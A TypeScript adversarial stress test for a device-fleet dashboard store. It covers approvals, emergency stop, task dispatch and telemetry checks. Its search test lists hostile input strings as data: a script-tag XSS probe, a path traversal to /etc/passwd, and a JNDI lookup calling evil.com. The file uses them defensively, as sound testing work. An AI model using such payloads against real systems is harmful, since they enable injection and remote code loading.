import { dashboardStore } from '../../../apps/dashboard/src/state/dashboardStore.ts';

async function stressTest() {
  console.log('--- STARTING ADVERSARIAL STRESS TEST ---');
  let failures: string[] = [];

  // Test 1: Non-existent approval ID
  try {
    const auditCountBefore = dashboardStore.getState().auditEvents.length;
    await dashboardStore.resolveApproval('APR-DOES-NOT-EXIST', 'approved', 'bad id');
    if (dashboardStore.getState().auditEvents.length !== auditCountBefore) {
      failures.push('resolveApproval with bad ID modified auditEvents!');
    }
  } catch (err) {
    failures.push(`resolveApproval with bad ID threw error: ${err}`);
  }

  // Test 2: Double trigger of Emergency Stop
  try {
    await dashboardStore.triggerEmergencyStop();
    const countAfterFirst = dashboardStore.getState().auditEvents.length;
    await dashboardStore.triggerEmergencyStop();
    const countAfterSecond = dashboardStore.getState().auditEvents.length;
    if (!dashboardStore.getState().isEmergencyStopActive) {
      failures.push('Emergency stop state should remain true on double trigger');
    }
  } catch (err) {
    failures.push(`Double emergency stop threw error: ${err}`);
  }

  // Test 3: Resume fleet when not in emergency stop
  try {
    await dashboardStore.resumeFleet();
    await dashboardStore.resumeFleet(); // redundant resume
    if (dashboardStore.getState().isEmergencyStopActive) {
      failures.push('Emergency stop should be false after resume');
    }
  } catch (err) {
    failures.push(`Redundant resume threw error: ${err}`);
  }

  // Test 4: Task dispatch to non-existent node
  try {
    const task = await dashboardStore.dispatchTask({
      deviceId: 'ghost-node-999',
      tool: 'shell.exec',
      args: { command: 'uptime' },
    });
    if (task.deviceHostname !== 'ghost-node-999') {
      failures.push(`Expected deviceHostname fallback to ghost-node-999, got ${task.deviceHostname}`);
    }
  } catch (err) {
    failures.push(`Dispatch to ghost node threw error: ${err}`);
  }

  // Test 5: Verify all 40 devices have valid telemetry structure
  const devices = dashboardStore.getState().devices;
  if (devices.length !== 40) {
    failures.push(`Expected 40 devices, got ${devices.length}`);
  }
  for (const d of devices) {
    if (!d.telemetry) {
      failures.push(`Device ${d.id} missing telemetry`);
    } else {
      if (typeof d.telemetry.cpuPercent !== 'number' || isNaN(d.telemetry.cpuPercent)) {
        failures.push(`Device ${d.id} has invalid cpuPercent: ${d.telemetry.cpuPercent}`);
      }
      if (typeof d.telemetry.memoryUsedGb !== 'number' || isNaN(d.telemetry.memoryUsedGb)) {
        failures.push(`Device ${d.id} has invalid memoryUsedGb: ${d.telemetry.memoryUsedGb}`);
      }
      if (!Array.isArray(d.telemetry.cpuCores) || d.telemetry.cpuCores.length === 0) {
        failures.push(`Device ${d.id} has invalid cpuCores array`);
      }
    }
  }

  // Test 6: Check command palette search logic with adversarial strings
  const searchQueries = [
    '<script>alert(1)</script>',
    '\\0\\n\\r',
    '../../etc/passwd',
    '${jndi:ldap://evil.com}',
    '["test"]',
    '   ',
    'a'.repeat(500),
    'srv-win-prod',
    'ubuntu',
    'darwin',
  ];

  for (const q of searchQueries) {
    try {
      const qLower = q.toLowerCase();
      const filtered = devices.filter(
        d => d.name.toLowerCase().includes(qLower) || d.hostname.toLowerCase().includes(qLower)
      );
      // Valid filter execution without throwing
    } catch (err) {
      failures.push(`Search query "${q}" threw error: ${err}`);
    }
  }

  console.log('--- ADVERSARIAL STRESS TEST COMPLETE ---');
  if (failures.length === 0) {
    console.log('SUCCESS: All adversarial stress test scenarios PASSED with 0 failures.');
  } else {
    console.error(`FAILURES (${failures.length}):\n` + failures.join('\n'));
    process.exit(1);
  }
}

stressTest().catch(console.error);
